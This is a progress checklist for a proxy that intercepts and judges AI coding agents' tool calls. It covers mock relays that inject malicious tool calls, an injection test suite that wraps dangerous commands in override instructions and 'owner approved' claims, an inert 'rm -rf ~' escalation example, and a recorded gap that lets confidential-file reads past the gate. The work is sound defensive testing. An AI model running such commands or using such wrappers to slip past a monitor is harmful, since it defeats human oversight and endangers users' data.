  - 真实中转站改写 ≥5 轮（含拦截）；实测 signature/prefix 400 时按 DESIGN 有界兼容模式缓存 thinking 后再决定丢弃，仅处理受影响轮次与匹配 replay，不能撤回已发送块；该证据分支启用 strip_thinking_on_rewrite 默认行为并重跑。剥 safeguards 后 beta 400 验证默认删除；保留 beta 也成功则增加独立 upstream strip_beta:false（默认 true，forward_safeguards 仍是布尔），不引入矛盾 schema。
  - C08 明确负责 conditional strip_beta schema/default/example/docs/tests：默认删除仅危险 beta、保留其他值；确认某 upstream 不剥也可用后允许 `strip_beta:false`，与 forward_safeguards 的 true/false 组合均测试，实测版本/端点/两种 beta 结果写 compat。无实机证据不得关闭此调查。
  - 位置：`src/protocols/anthropic/stream.ts`、`src/config/schema.ts`、`docs/compat.md`。
  - 完成标准：多轮会话无 400；结论入文档。

- [x] P3-6 集成测试：mock 中转站与 mock 决策提供方
  - mock 中转站：Hono 服务，按场景返回脚本化响应（纯文本、良性 tool_use、注入恶意 tool_use、并行 tool_use、带/不带上游 `safeguard_results`、非流式），三种协议各一套。mock 决策提供方：按命令关键字返回预设概率，可模拟超时、429、529、5xx。
  - 位置：`test/integration/{mock-relay,mock-decision}.ts`、`test/integration/anthropic.test.ts`。
  - 完成标准：覆盖 enforce/shadow、vault/passthrough、注入拦截、并行部分拦截、全链失败 fail-closed、缓存命中、改道换凭证。
  - C11 GREEN DRAFT own criterion VERIFIED：父代理22:56:12 typecheck/lint/36 files/2214 tests/build 全通过，三协议实际 HTTP matrix 全36例通过；覆盖 enforce/shadow、vault/passthrough、注入/并行部分拦截、全链失败、缓存、换凭证改道。改道指原有 R7 精确 Anthropic-shaped classifier payload 经所有 generation ingress；原生 Responses/Chat classifier 格式不匹配并保持 main，不虚构支持。Anthropic native safeguard_results 与另外两协议不适用情况分账；不借邻项真实客户端/provider/cache 条件否定本项 mock 集成标准。独立评审与 C11 closure 仍待完成。

  - [x] Historical C10 protocol-applicable Responses subset was verified by G2091/43 actual HTTP cases: pure/benign/inert malicious/parallel/nonstream; enforce/nonblocking byte-exact shadow; vault/passthrough credential handling; timeout/429/529/5xx failover/full-chain block; local cache/context separation. C11 now completes all3 protocols above. The old C10 hybrid Anthropic-fingerprint-on-Responses route-gated assumption was removed under existing R7: exact Anthropic-shaped classifier payload reroutes across generation ingress; native Responses classifier format still does not match. No Responses safeguard_results/native-classifier support is invented.

- [x] P3-7 Claude Code 接入文档
  - CLI：`ANTHROPIC_BASE_URL=http://127.0.0.1:8484/cc`、`ANTHROPIC_AUTH_TOKEN=<amp token>`、`ANTHROPIC_API_KEY=""`、建议 `CLAUDE_CODE_GATEWAY_HINT_HEADERS=1`；Desktop：Developer Mode → Configure Third-Party Inference 填代理地址与 token；若 Desktop 不接受 loopback 地址，写明改用云端 https 地址；成本提示 `CLAUDE_CODE_AUTO_MODE_MODEL=claude-haiku-5-5`。`init` 命令打印同样片段。
  - 位置：`docs/agents/claude-code.md`、`src/cli/init.ts`。
  - 完成标准：按文档从零接入成功（CLI 与 Desktop 各一次），结果记入 `docs/compat.md`。
  - IMPLEMENTED+VERIFIED/CHECKED: actualCLI349/TUI520 and LinuxDesktop4.29.0MANAGEDstatic-token recipe(notDeveloperModeUI),5normalGUI/harmlessrewriteblock/noexecution/postnormal/STOP1129.61exit0. GuidevalidatedJSON/security/discovery/explicitCode/model/ownedfolder matches currentcorrectedinit/Linuxpath/staticAMPtoken/helperunexercised/Codeguide. Parentcurrent09:26:42fullG1606/27files/typecheck/lint/build+actualinitCLI smokeexit0/configcreated/tokenredacted/stderrEmpty/26knownPIDsabsent; bothfinalcorrectionreviewsCLEAN2339ec7. C08LOCALLYCLOSED, no mandatoryDesktopAuto/native/helpertested/realprovider/cache/beta/p95 claim; P3-1/4/5/6unchecked/P3-2/3/7checked retained, parentclosurecommitbeforeC09.

### Phase 4：OpenAI Decisions 适配器与 LLM 二审

- **Historical pre-privacy-fix C09 functional checkpoint after local C08 `1b68116`, not closure:** parent10:25:04 unionG typecheck/lint/30files1716tests/build ALLPASS and actual private HTTP/CLI smoke exit0/all named gray/failure/accounting contracts PASS/10loopbackrequests. P4-3 own functional criteria were checked at that checkpoint, then reopened below for C09-SEC-001. P4-1/P4-2 full source tasks remain UNCHECKED for original real canaries. R1 absent-reviewer gray block, configured unavailability policy, invalid JSON unconditional block and nullable/no-double-charge accounting remain required. No worker runs/commits or C10+ activity.
- **C09 LOCALLY CLOSED by this closure tracker commit**, feature `a2ed309`/fix `c179cf1`; both independent re-reviews CLEAN (`agent://C09ProviderSecurityReview`, `agent://C09GateAccountingReview`), HIGH C09-SEC-001 CLOSED by security review. Parent current10:51:38 typecheck/lint/30files1721tests/build ALLPASS; actual functional HTTP/CLI10 ALLPASS and same8sink BEFORETRUE→AFTERFALSE/decision3/review3/cacheHittrue/no credential output. Required complete configured-secret/effective-policy context precedes unchanged1024 reason cap; R1/failure/unknown accounting unchanged. P4-3 CHECKED. Full P4-1/P4-2 remain unchecked only for original real canaries, not local source gaps. Private smokes were exercised then parent-removed; permanent regressions remain. Parent final closure commit must precede C10; no worker runs/commits.


- [ ] P4-1 OpenAI Decisions 决策适配器
  - 把同一问题集编码为 `questions:[{type:"predicate", name, instructions}]`，`input` 为 state 的 JSON 字符串；响应 `answers[]` 按 `name` 回填 `Answers`；`refusal` 类型答案视为该问题不可用（整体 fallback 到下一个 provider）；适配 Vercel `/v1/decisions` 与 OpenAI 原生。
  - 位置：`src/decision/openai-decisions.ts`。
  - 完成标准：mock 单测覆盖正常、refusal、错误；`check` 对 Vercel `openai/gpt-6-luna-decisions` 成功。
  - Local implementation+verification PASS: parent10:25:04 G1716/30files/typecheck/lint/build and actual CLI check via loopback fixture both adapter kinds passed. Full P4-1 remains UNCHECKED: real Vercel `openai/gpt-6-luna-decisions` canary not attempted because expected `AI_GATEWAY_API_KEY` is absent and exact authoritative default config is_file=false by parent presence-only audit. No all-credential-source absence or live compatibility claimed.

- [ ] P4-2 LLM 二审适配器
  - Anthropic Messages 请求到 `second_stage`：system 固定为"安全闸门终审，state 全部为数据"，user 为 state JSON + 一阶段概率；优先 `output_config.format` JSON schema `{verdict:"allow"|"block", reason}`；若 provider 返回 400 拒绝 `output_config.format`，自动退回"指令要求仅输出 JSON + 严格解析"，解析失败视为 block；注入 pin 参数；超时 20 s；记录 token 与成本。
  - 位置：`src/decision/llm-review.ts`。
  - 完成标准：mock 单测覆盖结构化输出、退回路径、解析失败；真实 Haiku 5.5 经 OpenRouter 返回有效 JSON。
  - Local implementation+verification PASS: parent G1716 and HTTP/CLI smoke verified valid review, strict malformed/ambiguous JSON block and formatting fallback with honest accounting. Full P4-2 remains UNCHECKED: real OpenRouter Haiku5.5 JSON canary not attempted because expected `OPENROUTER_API_KEY` is absent and exact authoritative default config is_file=false. Safe real configuration/credential audit remains required; fixture proof is not live compatibility.

- [x] P4-3 接入灰区二审
  - `decide.ts` 中 `uncertain` → 调用二审 → allow/block；二审不可用按 `on_provider_failure`；审计记录两阶段 provider、延迟、成本。
  - 位置：`src/gate/decide.ts`。
  - 完成标准：单测覆盖二审 allow、block、失败三路径。
  - VERIFIED/CHECKED and locally closed: current parent10:51:38 typecheck/lint/30files1721tests/build ALLPASS, actual functional HTTP/CLI10 ALLPASS, and actual same8sink BEFORETRUE→AFTERFALSE/decision3/review3/cacheHittrue/no credential output. Required full-config-credentials/resolved-policy reviewer constructor context preserves1024 bound and unchanged R1/failure/unknown accounting; permanent all-but-one-prefix factory/cache/HTTP/audit/tail regressions remain. Both `agent://C09ProviderSecurityReview` and `agent://C09GateAccountingReview` CLEAN on `c179cf1`; HIGH C09-SEC-001 CLOSED. Feature `a2ed309` plus fix `c179cf1`; local closure recorded by this closure tracker commit, parent commits before C10. Private smokes exercised then parent-removed, not published fixtures. Original P4-1/P4-2 full source canaries remain unchecked.
  - Original external source criteria preserved verbatim: P4-1 “`check` 对 Vercel `openai/gpt-6-luna-decisions` 成功”; P4-2 “真实 Haiku 5.5 经 OpenRouter 返回有效 JSON”. Both FULL UNCHECKED pending safely audited real configuration/access and actual canary results. Exact presence-only observations: `AI_GATEWAY_API_KEY=false`, `OPENROUTER_API_KEY=false`, authoritative `~/.config/auto-mode-proxy/config.yaml` is_file=false; no exhaustive credential/config-source absence claim and no local source implementation gap.

### Phase 5：Codex（OpenAI Responses）适配器

- **C10 LOCALLY CLOSED, NOT full P5/external acceptance.** ParentG21:57:09 typecheck/lint/33files2093tests/build PASS; unchanged892 localHTTP thresholds allPASS; independent metric math/counts audit CLEAN; ALL final db415c4 ProtocolSecurity/WiringCODE+ACCOUNTING/CLIparity reviews CLEAN/new[] and no reachable local C10 omission. Local fixtures/HTTP/currentcode parity/strict configuredCLI-loopback6case separate TGvD4b interpretation/timing/docs/readonlyDesktop diagnosis complete. Full P5-1 staysunchecked ONLY OWNrealJev/Clefp95 access+measurements; P5-2 ONLY OWNSDesktop safe-sandboxHOST+realrelay>=5 success (R5conditionaluntriggered); P5-3 ONLY OWNDesktopfromzero. Sourcecriteria below unchanged, narrow verified notes marked. No doablelocalC10work left; original800false/defaultgpt6.1CodeModeUnsupported/no currentnewSourceSDKrun or realcache/provider/GUI acceptance claim. P3-6Responsesverified/C11Chat dependency READY+IN SCOPE; worker didnot select/design/implement it. ParentapprovalFALSE/privatefreeze/actualevidence preserved.
  - [x] LOCAL IMPLEMENTED+VERIFIED+REVIEWED header guard: original S1 protocol findings CLOSED; inert both-protocol BEFORE/AFTER retained, no actual-client acceptance inferred from that API proof.
  - [x] LOCAL IMPLEMENTED+VERIFIED+REVIEWED known-JSON exact sizing/resource ledgers: G2091/reviews+qualified inert AFTER retained, allocation ORDER not heap-peak certification.
  - [x] LOCAL IMPLEMENTED+VERIFIED+REVIEWED PRE005 lifecycle:240s overall/5s shutdown/late ownership/unknown-cleanup failure; controlled runtime+G2091+implementation CLEAN, STATIC BEFORE not observedhang/process exitnotOSreap.
  - [x] LOCAL IMPLEMENTED+VERIFIED+REVIEWED RESP006007: reasoning association/adopted lease+trusted hypothetical shadow verdict/audit, G2091/inert AFTER/reviews CLEAN; not upstream-cache/provider proof.
  - [x] LOCAL IMPLEMENTED+VERIFIED+REVIEWED identity clarification:23924d7/G2091/BOTH implementationCLEAN/f73BOTHscriptCLEAN/parentOFFLINE EXIT0/TGvD4b independent auditCLEAN; scoped CLI-loopback verified via SEPARATE interpretation, original800false unchanged; no fullP5/Desktop/realprovider/defaultCodeMode claim.

- [ ] P5-1 Responses 流式拦截与改写
  - output_index → item；function_call/custom_tool_call/local_shell_call 扣留 added/参数 delta/done，在 output_item.done 对完整动作判定但直到全轮 ID 唯一性确认及全部判定后才放执行事件。首 execution 开启单向有界 ordered suffix：纯文本/早期 reasoning 即时，后续 stateful 生命周期/reasoning/终态按 SOURCE EVENT partial order 保留，而非按 index/added 排序。allow 保留原帧位置；block 的完整六事件 message 链可交错：原 added 位置发 output_item.added→content_part.added，原 done 位置发 output_text.delta→output_text.done→content_part.done→output_item.done（msg_amp_<n> 无碰撞）；不得在 added 提前发完整链。added0→added1→done1→done0 必须保持 completion1→0，allowed1 原位置不变；completed/incomplete.output[] 仍按 output_index 原位替换，usage 不变，sequence_number 严格单调。仅真正 control-only 可即时，所有 output-bearing 快照必须防未跟踪 execution；非流式保持数组序，shadow 原字节非阻塞，碰撞/超限/未闭合/超时/取消丢弃未放后缀且无执行泄漏。
  - 与 R5 分离：ordering retention 不是 reasoning stripping；没有实际 P5-2 reasoning 一致性错误，不启用 compat、不删当前/replay reasoning。所有 retained raw/decoded/parsed/终态/替换暂存共用 ≤8 MiB，reasoning 全部表示同时受独立 ≤4 MiB 子集约束，单 tool/frame ≤1 MiB 与 60s completion/30s idle/60s decision 不变。不修请求历史/index，不发早期可执行占位，不缓冲整轮纯文本，不放宽断言。barrier `9070cdb`/精度 `73e9b07` PLAN REVIEW CLEAN。资源/共享SSE及Anthropic迁移/精确sizing/header修正已有G2091/合格inert AFTER及独立protocol/resource/header/current-core CLEAN；trace证据限allocation ORDER而非heap peak，不取代尚待numeric timing/real-provider证据。
  - 位置：`src/protocols/openai-responses/{adapter,stream,nonstream}.ts`。
  - 完成标准：fixture 单测覆盖 `exec_command` 拦截、`apply_patch`（custom_tool_call）拦截、`local_shell_call`、并行项部分拦截、`sequence_number` 单调性断言。
  - [x] 原文完成标准（上行）已VERIFIED：exec_command/custom apply_patch/local_shell/partialparallel/monotonicsequence fixtures+G2091；下述定向fixture/actualHTTP/fullID-budget-failure/nonstream-shadow语义及actualCLI mixed source-order/exactdenial/native-result关联也已VERIFIED（独立TGvD4b解释报告，old800false保留）。
  - [ ] P5-1整项仅OWN真实Jev/Clef tool-tail p95未验证：“真实 provider p95 ≤1.5s Jev/≤0.5s Clef-flash 未测，不得以 mock/C08 成绩代替。” 未建立安全显式真实provider endpoint/model/credential访问；不是Desktop/cache邻居条件，也不是尚有localtiming任务。
  - [x] NARROW LOCAL 完整验证+审计CLEAN：G2093/db415c4全部postfix code/accounting/parity CLEAN/new[]；89220firstMAX36.222715ms<50/1000-eventMAX0.035717561ms/event<5/early5MAX1.793643ms<5/beforeproducerEOF TRUE，held10 rawdrain/paused另报。70total/12mock由completedwarmup+measured控制流推得，非伪造warmuprawrows；原873validFAIL/870CONFIGFAIL保留，不宣称realp95/heappeak。
  - 定向新增但不替代原标准：tool0→marker1、早期 text→tool→suffix、多项部分拒绝、reasoning/未知状态/控制交错、完整替换链/单调序号/终态数组/usage/nonstream parity；late duplicate、aggregate 与 reasoning 独立超限（含终态副本）、EOF/截止/取消、慢判定/背压/纯文本/shadow。实际 installed Codex mixed replay 捕获代理 wire 和立即下一请求 input 有序 tuples/身份/精确拒绝文本；原非交错 tool 完成后 marker 场景仍要求 tool/拒绝 message 在 marker 前，新增交错场景按 SOURCE EVENT completion partial order，不能按 index 套用此前条件。block 不留被拒工具/结果；允许项结果另行关联，CLI exit0/计数/mock 不替代实际或真实上游。原 P5-2/3 两模式、CLI/Desktop、inert exact-string、真实 ≥5 轮条件不变。
  - 延迟独立记账：direct baseline 首事件额外 <50 ms、1000-event 纯文本 <5 ms/event 不变；held suffix 从首扣留/收集结束/判定结束到释放及背压另报。真实 provider p95 ≤1.5s Jev/≤0.5s Clef-flash 未测，不得以 mock/C08 成绩代替。
  - 新增窄精度修订 **PLAN REVIEW CLEAN / committed `73e9b07`**（`agent://C10OrderingContractReview` 三份精度规划 CLEAN、无缺口）；`9070cdb` barrier 批准继续有效。夹具/HTTP 必含 denied0/allowed1 的 added0→added1→done1→done0、两段替换链/原 allowed 帧位置/completion1→0/final output[]0,1；实际 paired allow/deny replay 比较源事件完成顺序和下一 input，不按 index 排序/修历史。非交错 allow→marker 原要求仍保留；此精度的本地fixture/HTTP与actualCLI部分现由G2091/独立TGvD4b报告VERIFIED，不替代仍待Desktop/真实upstream条件。
  - 两模式command预算不变；741defaultgpt-6.1-sol CodeModeOnly缺exec_command正确failclosed，不能作为JS别名。原实际u30/gpt-5.5 flatnative/各模式1positive和独立TGvD4b6replay解释报告已验证，original800FAIL不变；perf后仅genericparity/codeReview+actualHTTP892，没有新的SDK原生运行或positive调用。Localtiming与Nodepath/readonlyHOSTsandbox诊断已完成，无doablelocalC10剩余；Desktop真实HOST和realprovider原条件保留。

- [ ] P5-2 调查：Codex 实机与回放一致性
  - 保留 `exec_command{cmd:"rm -rf ~", sandbox_permissions:"require_escalated"}` exact-string 的 inert policy/改写证据；真实 Codex CLI/Desktop 在 --yolo 与 Approve for me 下额外使用无害 denial probe + mock deny，绝不尝试真实破坏执行，分别记账，原外部要求未证实部分留 pending。随后 ≥5 轮真实上游 replay；如 reasoning 加密项一致性实测错误，启用 DESIGN 有界兼容缓冲及仅该轮 reasoning/replay 剔除（strip_reasoning_on_rewrite），记录证据后才设置该兼容分支默认。
  - 位置：`src/protocols/openai-responses/stream.ts`、`docs/compat.md`。
  - 完成标准：两种模式均拦截；多轮无上游错误；结论入文档。
  - [x] 分项VERIFIED：原exact-string仅inert policy/HTTP改写证明；真实installed CLI两模式各3harmless deny/1authorizedpositive/5normal、8turns无mock上游错误、strict6replay/完整audit+native关联，结论已入compat。
  - [ ] OWN pending：Desktop两模式实际接入/拒绝/replay的HOSTsafevendor-sandbox前提外部受阻（实际FATAL+kernel userns/AppArmorDENIED cap21，Node缺陷已修复，未观察auth）；只读诊断/targetcleanup资格已完成，无合规私有remedy，不改hostpolicy/禁sandbox/替换vendor/绕auth或retry。真实>=5upstream仍需显式realrelay配置+credential/model安全审计；reasoning错误分支未触发不预strip。CLI mock成功不替代这些自己的完整条件。

- [ ] P5-3 Codex 接入文档
  - `config.toml` 片段：`[model_providers.amp] name="auto-mode-proxy" base_url="http://127.0.0.1:8484/codex/v1" env_key="AMP_TOKEN" wire_api="responses" supports_websockets=false` 与顶层 `model_provider="amp"`；桌面版需让 GUI 进程看到环境变量（macOS `launchctl setenv`，Windows `setx`）。`init` 打印同片段。
  - 位置：`docs/agents/codex.md`、`src/cli/init.ts`。
  - 完成标准：按文档从零接入 CLI 与桌面版成功。
  - [x] 分项VERIFIED：所列config片段、顶层model_provider、GUI环境变量说明、init实际输出/测试及fresh CLI-from-zero到loopback成功。
  - [ ] OWN pending仅Desktop-from-zero成功：Nodefix有实际brokerready/appspawn证明，但vendor sandboxHOST前提由kernel相关拒绝证实且无获准私有remedy；未见UI/Codexsurface/traffic/auth。P5-3因此自己的Desktop条件外部待安全hostprovisioning，不借P5-2模式/real>=5或邻居cache阻止它；禁止不安全绕过，parentapprovalFALSE。

### Phase 6：WorkBuddy（OpenAI Chat Completions）适配器

- [x] P6-1 Chat Completions 流式拦截与改写
  - 按 `choices[0].delta.tool_calls[].index` 聚合 `id`、`function.name`、`function.arguments`；扣留该 index 的 chunk 直到流末（`finish_reason` 出现）判定；allow 放出，block 丢弃并追加一个 `delta.content` 说明 chunk；若无剩余 tool_calls，`finish_reason` 由 `tool_calls` 改为 `stop`；透传 `reasoning_content`、`usage` chunk、`[DONE]`。非流式同步处理 `message.tool_calls` 与 `finish_reason`。
  - 位置：`src/protocols/openai-chat/{adapter,stream,nonstream}.ts`。
  - 完成标准：fixture 单测覆盖单/多 tool_calls、部分拦截、`reasoning_content` 透传、非流式。
  - Historical GREEN DRAFT exercised coverage：父代理22:56:12 全量2214 tests/build/type/lint 与10例 actual HTTP smoke 通过已覆盖的单/多/部分拦截、reasoning、nonstream、usage/[DONE]、终态案例。后续 SEC-001..004 静态发现使 P6-1 重新打开；这些旧通过不能证明新增 allocation/ownership/usage/header 边界。实际 WorkBuddy UI/模式/头仍独立属于未勾选 P6-3，不替代 P6-1 自身修复。
  - [x] C11 R4/MATRIX001 独立 per-tool ≤1MiB 参数字节边界：父代理 TARGET946 有效 Unicode JSON、多帧各自低于 frame cap 的近界允许/累计超限与单独 frame cases 在 protocol+actualHTTP 均通过，matrix全36通过。保持同一参数字节 cap/断言，不借 frame/无效 JSON 代替 tool 边界。此局部 proof 不关闭 SEC-001..004 或恢复整体 P6-1/C11 green。
    - Historical artifact942：matrix/overflow cases 通过，但两个 below1MiB controls 当时失败（协议参数1048448bytes触发 aggregate ResponseBudget；actual HTTP terminated）。这不是缺失 tool cap 证据；后续 TARGET946 有效多字节 UTF-8 控制在不放宽同一参数字节 cap/断言下补足独立近界/超界 proof，见上项。
  - [x] C11-CHAT-SEC-001..004 本地修复/AFTER/独立复审CLOSED：父代理G2234(type/lint/36files2234tests/build)、unchanged AFTER959、重复actualHTTP10/10trusted mock requests/12audit/cleanuptrue均通过。SEC-002源引用清理独立复审CLEAN，order trace非heap/livepeak。P6-1自身local标准checked；三项postfix review CLEAN/new[]，native containment001/inspector002003修复复审SAFE+actual AFTER970完成后C11 LOCALLY CLOSED。P6-3实际模式/头/工具/≥5turn未观察且原文未缩减，完整外部前提/分账见下项，localclosure不等于整体goal完成。
    - Historical TARGET946：SEC-003/004的7个HTTP BEFORE失败（早发usage2、duplicate usage2未及时拒绝/取消而5000ms超时、deferred event/id缺失3）已观察；当时SEC-001/002还仅静态且A held。后续948资源/API trace与修复release状态以上项为准，保留946原始失败事实，不推断heap/livepeak或整体完成。

- [x] P6-2 WorkBuddy 工具映射与路径处理
  - route 级 `tool_map{<tool_name>: command|file_write|url|mcp|other, arg?}` 配置；无映射时用 P2-1 启发式；Windows 路径归一化（反斜杠、盘符、`%USERPROFILE%`）用于敏感路径与项目目录判断；`project_dirs` 来自 route 配置。
  - 位置：`src/gate/normalize/workbuddy.ts`、`src/policy/sensitive-paths.ts`。
  - 完成标准：单测覆盖映射优先级与 Windows 路径用例。
  - Own mapping/Windows criterion VERIFIED：复用 C06 已有映射/启发式/Windows 词法规则与 LOCKED other，补充权威 arg 选择、缺失/错误参数 fail-closed、有效空文件内容及 normalize→sensitive policy 回归；父代理22:56:12 全量2214 tests/type/lint/build 与实际映射/路径边界探针通过。route project_dirs 不等于客户端 home；缺少可信 home/userprofile 时 %USERPROFILE% 保持 unresolved_path，禁止借用宿主环境/猜 home，不增设配置面。独立评审与 C11 closure 待完成。

- [ ] P6-3 调查与接入文档：WorkBuddy 实机
  - 设置 > 模型 > 添加模型 > 自定义，URL 填 `http://127.0.0.1:8484/workbuddy/v1/chat/completions`，API Key 填 amp token，开启工具调用；安全中心开启"AI 智能审批 = 自动审批"，不处于"完全访问"。经 Chat mock 中转站注入命令验证被拦截。抓取请求头，若存在 `X-Agent-Type: auxiliary` 则记入 `docs/compat.md` 供二期改道。
  - 位置：`docs/agents/workbuddy.md`（中文为主）、`docs/compat.md`、`src/cli/init.ts`。
  - 完成标准：接入成功、拦截生效、头信息记录。
  - C11 的本地 Chat fixtures/HTTP 与真实 WorkBuddy 验收分账：自动审批模式、非完全访问、真实注入拦截、实际辅助头存在/不存在及 ≥5 轮必须由实际客户端观察，不能从 mock 注册场景或 init 片段推断。
  - **C11 LOCALLY CLOSED，P6-3自身仍未完成：**源01847b9三项复审CLEAN、父代理G2234/AFTER959/featureHTTP10及private AFTER970/Stage3/4 SAFE；reachable local修复/调查/准备结束。精确官方Linuxx64DEB/RPM metadata GET均404；scoped无现有app、无accessible approved genuine artifact/operator GUI host。需要该具体前提后才可观察原文完整接入/工具调用、"AI 智能审批 = 自动审批"且非"完全访问"、无害mock注入拦截/无执行、实际辅助头有/无；不以DefaultPermissions/CodeBuddyCLI/Enterprise/online替代，不称Linux不支持/认证或沙箱失败。
  - ≥5native正常轮次属于Validation原文“WorkBuddy（自动审批开启）各完成一次注入拦截验证与一次 ≥ 5 轮正常对话”，仍未观察且全局框不勾选；不追加P6-1/P6-2/P3-6 own条件。guide/compat/init已实现，不等于P6-3“接入成功、拦截生效、头信息记录”。完整原文不改；local closure不是完整P6-3/overallGoal验收。

### Phase 7：评测与校准

- [x] P7-1 评测用例集
  - `eval/cases.jsonl` ≥ 150 条，字段 `{id, protocol, tool_call, label:"allow"|"block", category, source, notes}`；类别：只读、构建/测试、项目内修改、系统变更、破坏性、外传、下载即执行、削弱安全、项目外写入、对抗样本（命令注释含 "owner approved"、善意包装、base64 混淆、复合管道）。引用 MIT 许可的公开用例需在 `source` 注明。
  - 位置：`eval/cases.jsonl`、`eval/README.md`。
  - 完成标准：每类 ≥ 10 条；`npm run eval -- --validate` 校验 schema 通过。
  - Parent current verification after the audited label-preserving fixture correction: source and built `eval --validate` both EXIT0, 150 cases / ten categories (15 each) / both labels (57 allow, 93 block) / three templates. Cases and templates remain data only; schema/count acceptance does not claim policy accuracy or live-provider acceptance.

- [ ] P7-2 评测运行器
  - `auto-mode-proxy eval [--provider <id>] [--rules-only]`：对每条用例跑完整判定管线（含规则、provider、二审），输出拦截率（block 类）、误拦率（allow 类）、灰区比例、p50/p95 延迟、总成本，写 `eval/reports/<ts>.json`；门槛 拦截率 100% 且误拦 ≤ 5%，否则退出码 1；`--rules-only` 不调外部 provider。
  - 明确分母：block-rate = label=block 且最终有效 block / 全部 label=block；误拦率 = label=allow 且最终有效 block / 全部 label=allow，绝不丢弃 gray。rules-only review/unknown 记 raw uncertain，并按 enforce fail-closed 算 effective block；灰区比例 = raw uncertain / 全部样本，同时分标签报告，保留 raw/effective 两列。报告 rules-only 名称/配置/corpus-policy 指纹，不冒充 provider 成功；阈值不满足真实失败，不能靠移除 gray/安全标签通过。完整 provider/injection 报告独立。
  - 位置：`src/cli/eval.ts`、`eval/reports/.gitkeep`。
  - 完成标准：对真实 Jev 跑通并产出报告；`--rules-only` 在无密钥环境可运行。
  - First actual parent rules-only measurement EXIT1, report `eval/reports/2026-10-29T00-53-26-500Z-rules-only-559cad84-d6fc-4e88-a521-cde196f3e27d.json`: dangerous block 92/93 (98.9247%), safe false-block 50/57 (87.7193%), raw gray 129/150 (86%; safe 50/57, dangerous 79/93). All 50 safe blocks were unresolved review, including all 12 ordinary build/test and 12 project-edit controls. This is an actual failed no-provider accuracy gate, not a missing-key error or a passing mock report; no labels/denominators/thresholds were adjusted. Full Jev/provider evidence is separately pending.
  - **USER-APPROVED current gate contract (supersedes historical rules-only ≤5% exit requirement above; retains measured failure):** `offline_gate = A：安全与准确率分开验收`. DESIGN amendment freezes report `schema_version:2`, `selected_gate`, explicit `gates.offline_safety` and `gates.accuracy`; remove ambiguous report `passed`, rename metric booleans `accuracy_passed` / injection `safety_passed`, preserve raw/effective rows and every denominator/gray/error/latency/cost/fingerprint field. Rules-only selects offline-safety: no external calls/fail-open; complete valid baseline+all wrappers, zero dangerous baseline/wrapped effective allows, zero invalid/errors, recomputed provenance/invariants required. Still calculate/report numerical 100%/≤5% accuracy INCLUDING safe raw-review blocks; failed accuracy remains visibly FAILED even if offline gate exits 0. CLI exits 0 only selected-gate pass AND report archival success, otherwise 1; validation-only success never claims metric acceptance. No relabel/padding/gray exclusion or unsafe allow is authorized. Frozen audited corpus is 150/57 allow/93 block/15 per category; data/templates unchanged.
  - Full mode selects measured full-accuracy for the actual requested selection(s), with complete corpus+wrappers, dangerous block 100%, safe false-block≤5%, wrapped dangerous allows=0, invalid/errors=0. A successful `--provider <id>` diagnostic and successful archival retain exit0, but explicit `release_coverage` is incomplete and `assertFreshReport` rejects it. Full acceptance/release still requires EACH configured provider + ordered chain, complete release coverage and authorized trusted-provider provenance; mock/loopback factory smoke cannot satisfy this. Existing `live_acceptance:'unverified'` remains; source/offline/diagnostic green is not full accuracy acceptance. `assertFreshReport(archivedBytes:Uint8Array,current,receipt)` centrally hashes EXACT archived bytes, compares receipt SHA256, then strictly decodes/parses/validates SAME bytes; no parsed-object overload or receipt A/bytes B acceptance, even with matching config/engine. Exact receipt/freshness contract is in DESIGN; missing prerequisites keeps P7/full/release pending. No compatibility shim or retrospective reinterpretation of old failed report.
  - Targeted A/A plan re-review is CLEAN, parent-reported `new: []`: TR-01 CLOSED / TARGETREAD CLEAN and EVAL-01..03 CLOSED / TARGETEVAL CLEAN on DESIGN EA5E / CHECKLIST 64A9 / PROGRESS A1FA. Parent authorizes ONLY the three-file plan commit; source B/I and corpus remain frozen pending parent observation of the commit SHA and explicit implementation release. No checkbox, post-policy metric, report-v2 result or release acceptance is established by plan approval.
  - C12 own reachable local work is now CLOSED after green correction `97200006fb1f5b45ba105a74228e4fd0ce56b238`: all3 independent re-reviews CLEAN/new[] (`C12PolicyReReview` POL001002 CLOSED, `C12RunnerReReview` EVAL001003 CLOSED, `C12EvidenceReReview` metrics/freshness/docs CLEAN). Parent G2406/type/lint/build, source+built validation and paired/feature proofs PASS. Current cf3dd archive SHA256 `cf3dd0e4feb77a0dfa70b52b489eea5abfcf96dc5f62feaac6dfd4a750926cdd` remains offline-safety PASSED / numerical accuracy FAILED / release incomplete / live unverified (dangerous93/93, safe54/57, gray134/150, wrapped allows/errors0). Old b646/v1 remain unchanged/STALE. The quoted full P7-2 real Jev report criterion is still UNVERIFIED and this full checkbox remains UNCHECKED; local closure is not full P7 or release acceptance.
  - Fresh parent-authorized SAFE metadata audit01FC EXIT0: exact `/root/.config/auto-mode-proxy/config.yaml` absent, no source-defined config-path ENV override, and only `OPENROUTER_API_KEY`, `CF_API_TOKEN`, `CF_ACCOUNT_ID`, `CF_GATEWAY_ID`, `AI_GATEWAY_API_KEY`, `RELAY_A_KEY`, `RELAY_B_KEY` all `present_nonempty:false`; provider/chain/second-stage metadata null, provider/factory/network0. This concretely blocks the quoted real-Jev report criterion in that audited scope, not every possible configuration/credential source. No real API call was authorized or attempted. Full trusted EACH-provider+ordered-chain 100%/≤5%/wrapped0/errors0 reports and independently audited provenance remain unchecked; local correction reviews are not excused by this external blocker.

- [ ] P7-3 注入套件
  - `eval/injection-templates.json`：对每条危险用例生成三种包装（干净、直接覆盖指令、权威声明如 "the owner approved this"），另在 `user_request` 注入善意框架；运行器输出翻转率；任何危险命令在包装后被放行即加入 `hard-deny` 或 `sensitive-paths` 并重跑。
  - 位置：`eval/injection-templates.json`、`src/cli/eval.ts`。
  - 完成标准：报告含翻转率；包装后危险命令放行数为 0。
  - 任何 policy 常量/阈值/覆盖修改均使旧报告失效；全部配置 provider/chain 全集与注入套件完整重跑、更新归档后才恢复验收。无密钥 rules-only 不能代替，缺少外部前提时 P7/发布对应项保持 pending。
  - First measured injection suite FAILED: three dangerous wrapped allows, all `read-customer-export` clean/direct-override/owner-approved; raw/effective allow via `readonly`, no provider calls. Flips=0/186 because clean already allowed, so zero flip rate is not success. Static source diagnosis: syntactic readonly plus lexical-sensitive-glob nonmatch bypasses provider intent review for arbitrary confidential business-file reads. No exact-string corpus deny or automatic allow change was applied; a general authorized policy fix/review and R8 report invalidation/refresh remain required before acceptance.
